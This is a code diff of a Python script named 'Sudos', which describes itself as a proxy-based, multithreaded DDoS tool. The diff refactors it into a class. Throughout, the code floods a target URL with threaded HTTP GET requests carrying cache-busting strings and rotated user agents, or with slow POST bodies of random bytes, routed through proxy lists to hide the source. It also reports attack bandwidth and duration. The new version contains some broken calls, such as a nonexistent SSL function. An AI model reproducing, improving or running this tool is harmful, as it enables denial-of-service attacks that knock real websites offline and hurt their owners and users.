@@ -1,6 +1,8 @@
 #!/usr/bin/env python
-#version: 2.5.3 beta
-from rich.live import Live
+#version: 2.5.4-beta
+
+from collections import namedtuple
+
 import threading
 import argparse
 import requests
@@ -9,372 +11,430 @@ import atexit
 import socket
 import socks
 import time
-import ssl
 import sys
+import ssl
 import os
 
-start_time = 0
-active_connections = 0
-connection_limit = 0
-active_threads = 0
-max_threads = 100
-delay = 1
-running = True
-url = None
-url_dict = None
-target_stats = None
+class COLORS(object):
+    red = "\u001b[31;1m"
+    green = "\u001b[32;1m"
+    yellow = "\u001b[33;1m"
+    blue = "\u001b[34;1m"
+    purple = "\u001b[35;1m"
+    cyan = "\u001b[36;1m"
+    white = "\u001b[37;1m"
+    reset = "\u001b[0;0m"
 
-ups = 0
-total_ups = 0
-dps = 0
-total_dps = 0
-hrs = 0
-total_hrs = 0
-total_connected = 0
+class Sudos(object):
+    _hrs: int = 0
+    _ups: int = 0
+    _dps: int = 0
+    _thrs: int = 0
+    _tups: int = 0
+    _tdps: int = 0
+    _open_connections: int = 0
+    _active_threads: int = 0
+    _start_time: float = 0.0
+    user_agents: list = None
+    
+    def __init__(self):
+        self.max_threads: int = 100
+        self.timeout: int = 5
+        self.delay: int = 1
+        self.receive_buffer: int = 65536
+        
+        self.anti_cache: bool = True
+        self.receive_response: bool = False
 
-RED = "\u001b[31;1m"
-GREEN = "\u001b[32;1m"
-YELLOW = "\u001b[33;1m"
-BLUE = "\u001b[34;1m"
-RESET = "\u001b[0;0m"
-
-try:
-    if not os.path.exists("etc"):
-        os.mkdir("etc")
-        if not os.path.exists("./etc/useragents.txt"):
-            user_agents = requests.get("https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt").text
-            user_agents_file = open("./etc/useragents.txt", "w")
-            user_agents_file.write(user_agents)
-            user_agents_file.close()
-
-    user_agents_file = open("./etc/useragents.txt")
-    user_agents = user_agents_file.read().splitlines()
-    user_agents_file.close()
-except Exception as e:
-    print(f"Unable to fetch useragents.txt: {e}")
-    sys.exit()
-
-def sudos(url, method, **kwargs):
-    try:
-        global active_threads
-        global active_connections
-        global hrs
-        global total_hrs
-        global total_connected
-        global dps
-        global total_dps
-        global ups
-        global total_ups
-        active_threads += 1
-        connected = False
-        proxy_type = kwargs.get("proxy_type")
-        proxy_host = kwargs.get("proxy_host")
-        proxy_port = kwargs.get("proxy_port")
-        receive_http = kwargs.get("receive_http")
-        url_dict = url_split(url)
-        if not url_dict:
-            print(f"sudos error: invalid url")
-            return
-        protocol = url_dict["protocol"]
-        host = url_dict["domain"]
-        port = url_dict["port"]
-        path = url_dict["path"]
-        parameters = url_dict["parameters"]
-        if proxy_host:
-            if not proxy_type:
-                print(f"sudos error: missing proxy type")
-                return
-            elif not proxy_port:
-                print(f"sudos error: missing proxy port")
-                return
+    @staticmethod
+    def split_url(url: str) -> namedtuple:
+        try:
+            url = url.strip()    
+            
             try:
-                proxy_port = int(proxy_port)
+                protocol, url = url.split("://", 1)
             except ValueError:
-                print(f"sudos error: unable to convert proxy port to integer")
                 return
-        if proxy_host:
-            sock = socks.socksocket()
-            sock.set_proxy(proxy_type, proxy_host, proxy_port)
-        else:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((host, port))
-        connected = True
-        active_connections += 1
-        total_connected += 1
-        if protocol == "https":
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.VerifyMode.CERT_NONE
-            sock = context.wrap_socket(sock, server_hostname=host)
-        if parameters:
-            parameters = f"&{parameters}"
-        else:
-            parameters = ""
-        if method == "1":
-            while True:
-                if active_connections < connection_limit:
-                    continue
-                anti_cache = rand_chars(77)
-                user_agent = random.choice(user_agents)
-                http = f"GET {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
-                up = sock.send(http.encode())
-                ups += up
-                total_ups += up
-                hrs += 1
-                total_hrs += 1
-                if receive_http:
-                    while True:
-                        receive = sock.recv(1024)
-                        download = len(receive)
-                        dps += download
-                        total_dps += download
-                        if download < 1024:
-                            break
-                time.sleep(delay)
-        elif method == "2":
-            while True:
-                if active_connections < connection_limit:
-                    continue
-                anti_cache = rand_chars(77)
-                user_agent = random.choice(user_agents)
-                content = random._urandom(4096)
-                http = f"POST {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(content)}\r\n\r\n"
-                up = sock.send(http.encode())
-                ups += up
-                total_ups += up
-                hrs += 1
-                total_hrs += 1
-                for text in content:
-                    text = str(text)
-                    up = sock.send(text.encode())
-                    ups += up
-                    total_ups += up
-                    time.sleep(delay)
-    except Exception as e:
-        #print(f"sudos error: {e}")
-        pass
-    finally:
-        active_threads -= 1
-        if connected:
-            active_connections -= 1
-
-def clear_console():
-    if sys.platform == "linux":
-        os.system("clear")
-    elif sys.platform == "win32":
-        os.system("cls")
-
-def rand_chars(length):
-    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    chars_list = list(chars)
-    rand_text = random.choices(chars_list, k=length)
-    text = "".join(rand_text)
-    return text
-
-def getinfo():
-    text = f"""
- [bold green]TARGET STATUS[/bold green]
- Domain:        {url_dict['domain']}
- Port:          {url_dict['port']}
- Status:        {target_stats}
-
- [bold green]ATTACK STATUS[/bold green]
- Threads:       {active_threads}
- Connected:     {active_connections}
- HR/s:          {hrs}
- U/s:           {ups} Byte(s)
- D/s:           {dps} Byte(s)
-    """
-    return text
-
-def target_status():
-    try:
-        global target_stats
-        url = f"{url_dict['protocol']}://{url_dict['domain']}{url_dict['path']}"
-        while True:
+            
             try:
-                anti_cache = rand_chars(77)
-                r = requests.get(f"{url}?{anti_cache}", headers={"User-Agent": random.choice(user_agents)})
-                target_stats = f"{r.status_code} {r.reason}"
-                time.sleep(1)
-            except Exception:
-                continue
-    except Exception:
-        pass
-
-def verbose():
-    try:
-        global hrs
-        global dps
-        global ups
-        threading.Thread(target=target_status, daemon=True).start()
-        with Live(getinfo(), auto_refresh=True) as live:
-            while True:
-                if not running:
-                    break
-                live.update(getinfo())
-                hrs = 0
-                dps = 0
-                ups = 0
-                time.sleep(1)
-    except KeyboardInterrupt:
-        sys.exit()
-    except Exception as e:
-        print(f"verbose error: {e}")
-        pass
-
-def url_split(url):
-    try:
-        try:
-            protocol, url = url.split("://", 1)
-        except ValueError:
-            return
-        try:
-            domain, path = url.split("/", 1)
-        except ValueError:
-            domain = url
-            path = ""
-        try:
-            domain, port = domain.split(":", 1)
-        except ValueError:
+                domain, path = url.split("/", 1)
+            except ValueError:
+                domain = url
+                path = ""
+            
+            try:
+                domain, port = domain.split(":", 1)
+            except ValueError:
+                domain = domain
+                port = 80
+            
+            try:
+                path, parameters = path.split("?", 1)
+            except ValueError:
+                path = path
+                parameters = None
+            
+            try:
+                path, fragments = path.split("#", 1)
+            except ValueError:
+                path = path
+                fragments = None
+            
+            path = f"/{path}"
             if protocol == "https":
                 port = 443
-            else:
-                port = 80
-        port = int(port)
+            if parameters:
+                parameters = f"?{parameters}"
+            if fragments:
+                fragments = f"#{fragments}"
+            
+            url_dict = {}
+            url_dict["protocol"] = protocol
+            url_dict["domain"] = domain
+            url_dict["port"] = port
+            url_dict["path"] = path
+            url_dict["parameters"] = parameters
+            url_dict["fragments"] = fragments
+            
+            url_struct = namedtuple("URLObject", "protocol domain port path parameters fragments")
+            url_object = url_struct(**url_dict)
+            
+            return url_object
+        except Exception:
+            return
+
+    @staticmethod
+    def random_string(length: int) -> str:
         try:
-            path, parameters = path.split("?", 1)
-        except ValueError:
-            parameters = None
-        path = f"/{path}"
-        url_dict = {}
-        url_dict["protocol"] = protocol
-        url_dict["domain"] = domain
-        url_dict["port"] = port
-        url_dict["path"] = path
-        url_dict["parameters"] = parameters
-        return url_dict
-    except Exception:
-        return
+            chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
+            string = random.choices(list(chars), k=length)
+            string = "".join(string)
+            
+            return string
+        except Exception as e:
+            print(f"random_string error: {e}")
+            pass
 
-def bytecount(bytesize):
-    total = f"{bytesize} B"
-    if bytesize >= 1000:
-        total = bytesize / 1000
-        total = f"{total:.2f} kB"
-    if bytesize >= 1000000:
-        total = bytesize / 1000000
-        total = f"{total:.2f} MB"
-    if bytesize >= 1000000000:
-        total = bytesize / 1000000000
-        total = f"{total:.2f} GB"
-    if bytesize >= 1000000000000:
-        total = bytesize / 1000000000000
-        total = f"{total:.2f} TB"
-    return total
-
-def onexit():
-    attack_duration = time.time() - start_time
-    attack_duration = f"{attack_duration:.2f}"
-    total_download = bytecount(total_dps)
-    total_upload = bytecount(total_ups)
-    print(f"\r\nTotal Requests: {total_hrs}\r\nTotal Connected: {total_connected}\r\nTotal Download: {total_download}\r\nTotal Upload: {total_upload}\r\n\r\nAttack Duration: {attack_duration} seconds")
-
-def main():
-    try:
-        global max_threads
-        global delay
-        global connection_limit
-        global start_time
-        global running
-        global url
-        global url_dict
-        parser = argparse.ArgumentParser(description="SuDOS, powerful layer 7 proxy-based DDoS tool.")
-        parser.add_argument("-t", "--threads", type=int, default=100, metavar="THREAD", help="Max thread count")
-        parser.add_argument("-z", "--proxy-type", choices=["http", "socks4", "socks5"], metavar="PROXYTYPE", help="Proxy list type")
-        parser.add_argument("-x", "--proxy-list", metavar="PROXYFILE", help="Proxy list file")
-        parser.add_argument("-c", "--timeout", type=int, default=5, metavar="TIMEOUT", help="Socket connection timeout")
-        parser.add_argument("-v", "--delay", type=int, default=1, metavar="DELAY", help="Timeout per HTTP request")
-        parser.add_argument("-b", "--connection-limit", type=int, metavar="LIMIT", help="Connected socket count before initializing the attack")
-        parser.add_argument("-n", "--receive-http", action="store_true", help="Whether to receive HTTP response or not")
-        parser.add_argument("-m", "--method", choices=["1", "2"], default="1",  metavar="METHOD", help="Attack method")
-        parser.add_argument("url", nargs="?", metavar="URL", help="Target URL including protocol, domain and port for particular use")
-        args = parser.parse_args()
-
-        max_threads = args.threads
-        proxy_type = args.proxy_type
-        proxy_list = args.proxy_list
-        timeout = args.timeout
-        receive_http = args.receive_http
-        method = args.method
-        
-        url = args.url
-        if not url:
-            print(f"ERROR: URL is required")
-            parser.print_usage()
-            sys.exit()
-        
-        socket.setdefaulttimeout(timeout)
-        delay = args.delay
-
-        if args.connection_limit:
-            connection_limit = args.connection_limit
-
-        if not url_split(url):
-            print(f"ERROR: Invalid URL")
-            sys.exit()
-
-        url_dict = url_split(url)
-
-        if proxy_list:
-            if not proxy_type:
-                print(f"ERROR: Proxy type is missing")
+    def random_user_agent(self) -> str:
+        try:
+            if not type(self.user_agents) == list:
+                print("Unable to load useragents")
                 sys.exit()
+            return random.choice(self.user_agents)
+        except Exception as e:
+            print(f"random_user_agent error: {e}")
+            pass
+
+    def load_user_agent(self) -> None:
+        try:
+            if not os.path.exists("etc"):
+                os.mkdir("etc")
+            os.chdir("etc")
+            if not os.path.exists("useragents.txt"):
+                print(f"[+] Downloading useragents")
+                http = requests.get("https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt")
+                with open("useragents.txt", "w") as f:
+                    f.write(http.text)
+                    f.close()
+            with open("useragents.txt") as f:
+                self.user_agents = f.read().splitlines()
+                f.close()
+            os.chdir("..")
+        except Exception as e:
+            print(f"load_user_agent error: {e}")
+            sys.exit()
+
+    def http(self, url: str, **kwargs) -> None:
+        try:
+            self._active_threads += 1
+            
+            connected = False
+            kwargs.setdefault("method", 1)
+            methods = [1, 2]
             try:
-                proxy_list = open(proxy_list, "r")
-                proxies = proxy_list.readlines()
-                proxy_list.close()
-            except FileNotFoundError:
-                print(f"ERROR: Proxy list file not found")
-                sys.exit()
+                method = int(kwargs.get("method"))
+            except Exception as e:
+                return 1
+            if not method in methods:
+                return 1
+            
+            url = Sudos.split_url(url)
+            if not url:
+                return 2
+            try:
+                port = int(url.port)
             except Exception:
-                print(f"ERROR: Invalid proxy list file")
-                sys.exit()
-            proxy_type = proxy_type.upper()
-            proxy_type = getattr(socks, proxy_type)
-        atexit.register(onexit)
-        start_time = time.time()
-        clear_console()
-        threading.Thread(target=verbose, daemon=True).start()
-        if proxy_list:
-            while True:
-                for proxy in proxies:
-                    proxy = proxy.strip()
+                return 2
+            
+            use_proxy = False
+            if kwargs.get("proxy_protocol") or kwargs.get("proxy_host") or kwargs.get("proxy_port"):
+                use_proxy = True
+                if not (kwargs.get("proxy_protocol") and kwargs.get("proxy_host") and kwargs.get("proxy_port")):
+                    return 3
+                else:
+                    proxy_protocol = kwargs.get("proxy_protocol")
+                    proxy_host = kwargs.get("proxy_host")
+                    proxy_port = kwargs.get("proxy_port")
+                    
+                    proxy_protocol = proxy_protocol.upper()
+                    
                     try:
-                        proxy_host, proxy_port = proxy.split(":")
+                        proxy_protocol = getattr(socks, f"PROXY_TYPE_{proxy_protocol}")
                     except Exception:
-                        continue
+                        return 3
+                    
                     try:
                         proxy_port = int(proxy_port)
                     except Exception:
-                        continue
-                    while True:
-                        if active_threads >= max_threads:
-                            continue
-                        threading.Thread(target=sudos, args=[url, method], kwargs={"proxy_type": proxy_type, "proxy_host": proxy_host, "proxy_port": proxy_port, "receive_http": receive_http}, daemon=True).start()
-                        break
-        else:
+                        return 3
+            
+            if use_proxy:
+                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.set_proxy(proxy_protocol, proxy_host, proxy_port)
+            else:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            
+            try:
+                timeout = int(self.timeout)
+            except Exception:
+                timeout = 5
+            
+            sock.connect((url.domain, port))
+            if url.protocol == "https":
+                context = ssl.create_default_socket()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                sock = context.wrap_socket(sock)
+            connected = True
+            self._open_connections += 1
+            
+            try:
+                delay = int(self.delay)
+            except Exception:
+                delay = 1
+            
+            url_parameters = url.parameters
+            fragments = url.fragments
+            
+            if url_parameters == None:
+                url_parameters = ""
+            if fragments == None:
+                fragments = ""
+            
+            default_headers = {}
+            default_headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+            default_headers["Accept-Encoding"] = "gzip, deflate, br"
+            default_headers["Accept-Language"] = "en-US,en;q=0.5"
+            default_headers["Connection"] = "keep-alive"
+            default_headers["DNT"] = "1"
+            default_headers["Host"] = url.domain
+            default_headers["Sec-GPC"] = "1"
+            default_headers["TE"] = "Trailers"
+            default_headers["Upgrade-Insecure-Requests"] = "1"
+            
+            default_headers_string = ""
+            for header in default_headers:
+                header_name = header
+                header_value = default_headers[header_name]
+                default_headers_string += f"{header_name}: {header_value}\r\n"
+            
+            if method == 1:
+                while True:
+                    if self.anti_cache:
+                        randstr = Sudos.random_string(77)
+                        parameters = f"?{randstr}&{url_parameters[1:]}"
+                    else:
+                        parameters = f"{url_parameters}"
+                    full_path = f"{url.path}{parameters}{fragments}"
+                    
+                    user_agent = self.random_user_agent()
+                    http = f"GET {full_path} HTTP/1.1\r\n{default_headers_string}User-Agent: {user_agent}\r\n\r\n"
+                    
+                    data = sock.send(http.encode())
+                    self._hrs += 1
+                    self._ups += data
+                    self._thrs += 1
+                    self._tups += data
+                    
+                    if self.receive_response:
+                        sock.settimeout(1)
+                        while True:
+                            try:
+                                data = sock.recv(self.receive_buffer)
+                                if len(data) == 0:
+                                    break
+                                self._dps += len(data)
+                                self._tdps += len(data)
+                            except socket.timeout:
+                                break
+                        sock.settimeout(None)
+                    
+                    time.sleep(delay)
+            elif method == 2:
+                while True:
+                    if self.anti_cache:
+                        randstr = Sudos.random_string(77)
+                        parameters = f"?{randstr}&{url_parameters[1:]}"
+                    else:
+                        parameters = f"{url_parameters}"
+                    full_path = f"{url.path}{parameters}{fragments}"
+                    
+                    content = random._urandom(4096)
+                    
+                    user_agent = self.random_user_agent()
+                    http = f"POST {full_path} HTTP/1.1\r\n{default_headers_string}User-Agent: {user_agent}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(content)}\r\n\r\n"
+                    
+                    data = sock.send(http.encode())
+                    self._hrs += 1
+                    self._ups += data
+                    self._thrs += 1
+                    self._tups += data
+                    
+                    for text in content:
+                        text = str(text)
+                        data = sock.send(text.encode())
+                        self._ups += data
+                        self._tups += data
+                        time.sleep(delay)
+        except Exception:
+            pass
+        finally:
+            self._active_threads -= 1
+            if connected:
+                self._open_connections -= 1
+                    
+    def separate(self, length: int, string: str) -> str:
+        return " " * (length - len(str(string)))
+    
+    def display_status(self) -> None:
+        try:
+            theme1 = COLORS.purple
+            theme2 = COLORS.cyan
+            time.sleep(1)
             while True:
-                if active_threads >= max_threads:
-                    continue
-                threading.Thread(target=sudos, args=[url, method], daemon=True).start()
-    except KeyboardInterrupt:
-        running = False
-        time.sleep(1)
-        sys.exit()
-    except Exception as e:
-        print(f"main error: {e}")
-        pass
+                ups = self.bytecount(self._ups)
+                dps = self.bytecount(self._dps)
+                print(f"{theme1}T: {theme2}{self._active_threads}{self.separate(7, self._active_threads)}{theme1}C: {theme2}{self._open_connections}{self.separate(7, self._open_connections)}{theme1}H: {theme2}{self._hrs}{self.separate(10, self._hrs)}{theme1}U: {theme2}{ups}{self.separate(15, ups)}{theme1}D: {theme2}{dps}{COLORS.reset}")
+                self._hrs = 0
+                self._ups = 0
+                self._dps = 0
+                time.sleep(1)
+        except Exception as e:
+            print(f"display_status error: {e}")
+            pass
+    
+    def bytecount(self, bytesize: int) -> str:
+        try:
+            if bytesize >= 1000000000000:
+                total = bytesize / 1000000000000
+                total = f"{total:.2f} TB"
+            elif bytesize >= 1000000000:
+                total = bytesize / 1000000000
+                total = f"{total:.2f} GB"
+            elif bytesize >= 1000000:
+                total = bytesize / 1000000
+                total = f"{total:.2f} MB"
+            elif bytesize >= 1000:
+                total = bytesize / 1000
+                total = f"{total:.2f} kB"
+            else:
+                total = f"{bytesize:.2f} B"
+            return total
+        except Exception as e:
+            print(f"bytecount error: {e}")
+            pass
+    
+    def onexit(self) -> None:
+        tups = self.bytecount(self._tups)
+        tdps = self.bytecount(self._tdps)
+        total_bandwidth = self.bytecount(self._tups + self._tdps)
+        attack_duration = time.time() - self._start_time
+        theme1 = COLORS.purple
+        theme2 = COLORS.cyan
+        theme3 = COLORS.blue
+        print(f"\r\n\r\n{theme3}ATTACK STATISTICS\r\n{theme1}HTTP Request: {theme2}{self._thrs}\r\n{theme1}Upload Bandwidth: {theme2}{tups}\r\n{theme1}Download Bandwidth: {theme2}{tdps}\r\n\r\n{theme1}Total Bandwidth: {theme2}{total_bandwidth}\r\n{theme1}Attack Duration: {theme2}{attack_duration:.2f}\r\n")
+    
+    def initialize(self) -> None:
+        try:
+            parser = argparse.ArgumentParser(description="Sudos, proxy-based, multithreaded DDOS tool")
+            parser.add_argument("-t", "--threads", type=int, metavar="THREADS", help="Max threads value")
+            parser.add_argument("-z", "--proxy-type", type=str, metavar="PROXY TYPE", help="Proxy type followed by the proxy list")
+            parser.add_argument("-x", "--proxy-list", type=str, metavar="PROXY LIST", help="Proxy list path")
+            parser.add_argument("-c", "--timeout", type=int, metavar="TIMEOUT", help="Connection timeout value")
+            parser.add_argument("-v", "--delay", type=int, metavar="DELAY", help="HTTP request delay value")
+            parser.add_argument("-n", "--receive", action="store_true", help="Enables receive HTTP response")
+            parser.add_argument("-m", "--method", choices=["1", "2"], default=1, metavar="ATTACK METHOD", help="Attack method")
+            parser.add_argument("url", nargs="?", type=str, metavar="URL", help="Target URL")
+            args = parser.parse_args()
+            
+            if not args.url:
+                print("[-] URL is required")
+                parser.print_help()
+                return
+            
+            if not Sudos.split_url(args.url):
+                print("[-] Invalid URL Format. EXAMPLE: http://target.com/")
+                return
+            
+            if args.proxy_type or args.proxy_list:
+                if not args.proxy_type or not args.proxy_list:
+                    print("[-] Proxy type and proxy list arguments are required when using proxy")
+                    return
+            
+            if args.proxy_type:
+                try:
+                    proxy_protocol = args.proxy_type.upper()
+                    getattr(socks, f"PROXY_TYPE_{proxy_protocol}")
+                except Exception:
+                    print("[-] Invalid proxy type. PROXY TYPES: HTTP, SOCKS4, SOCKS5")
+                    return
+            
+            if args.proxy_list:
+                try:
+                    with open(args.proxy_list) as f:
+                        proxies = f.read().splitlines()
+                        f.close()
+                except Exception:
+                    print("[-] Invalid proxy list file")
+                    return
+            
+            if args.threads != None:
+                self.max_threads = args.threads
+            if args.timeout != None:
+                self.timeout = args.timeout
+            if args.delay != None:
+                self.delay = args.delay
+            if args.receive:
+                self.receive_response = True
+            
+            method = int(args.method)
+            
+            self.load_user_agent()
+            atexit.register(self.onexit)
+            threading.Thread(target=self.display_status, daemon=True).start()
+            self._start_time = time.time()
+            while True:
+                for proxy in proxies:
+                    proxy_host, proxy_port = proxy.split(":", 1)
+                    kwargs = {}
+                    kwargs["proxy_protocol"] = proxy_protocol
+                    kwargs["proxy_host"] = proxy_host
+                    kwargs["proxy_port"] = proxy_port
+                    kwargs["method"] = method
+                    while True:
+                        if self._active_threads >= self.max_threads:
+                            continue
+                        threading.Thread(target=self.http, args=[args.url], kwargs=kwargs, daemon=True).start()
+                        break
+        except KeyboardInterrupt:
+            sys.exit()
+        except Exception as e:
+            print(f"initialize error: {e}")
+            pass
+
+def main():
+    sudos = Sudos()
+    sudos.initialize()
 
 if __name__ == "__main__":
     main()
